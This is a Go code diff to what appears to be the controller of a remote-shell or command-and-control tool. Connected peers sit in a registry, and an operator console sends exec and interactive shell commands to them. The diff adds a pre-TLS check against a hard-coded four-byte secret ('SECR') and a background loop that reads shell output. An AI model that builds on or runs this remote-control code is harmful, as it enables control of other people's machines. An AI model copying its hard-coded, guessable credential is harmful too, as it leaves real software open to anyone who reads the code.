@@ -229,6 +229,23 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	remoteAddr := conn.RemoteAddr().String()
 	logger.Printf("New connection from %s", remoteAddr)
 
+	// PSK Pre-Auth (V2.0 Supreme Protection)
+	// Before TLS Handshake, expect 4-byte PSK
+	pskBuf := make([]byte, 4)
+	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	if _, err := io.ReadFull(conn, pskBuf); err != nil {
+		logger.Printf("Pre-Auth failed (no PSK) from %s", remoteAddr)
+		conn.Close()
+		return
+	}
+	// Expected PSK for V2.0 (First 4 bytes of 'SECRET123' -> 'SECR')
+	if string(pskBuf) != "SECR" {
+		logger.Printf("Pre-Auth failed (invalid PSK) from %s", remoteAddr)
+		conn.Close()
+		return
+	}
+	logger.Printf("Pre-Auth successful from %s", remoteAddr)
+
 	// Explicit TLS Handshake for early error detection
 	if tlsConn, ok := conn.(*tls.Conn); ok {
 		tlsConn.SetDeadline(time.Now().Add(5 * time.Second))
@@ -413,6 +430,12 @@ func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 			}
 			shellMode = true
 			fmt.Println("Shell session started (type 'exit' to background)")
+			// V2.0: Interactive loop for shell
+			go func() {
+				for shellMode {
+					readCommandResponseWithMode(currentPeer, true)
+				}
+			}()
 		case "info":
 			if currentPeer == nil {
 				fmt.Println("Error: No active session.")
@@ -446,7 +469,7 @@ func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 					}
 					shellCmd := buildCommand(0x02, line+"\n")
 					sendCommand(currentPeer, shellCmd)
-					readCommandResponseWithMode(currentPeer, true)
+					// readCommandResponseWithMode is now handled by background goroutine
 				} else {
 					execCmd := buildCommand(0x01, line)
 					sendCommand(currentPeer, execCmd)
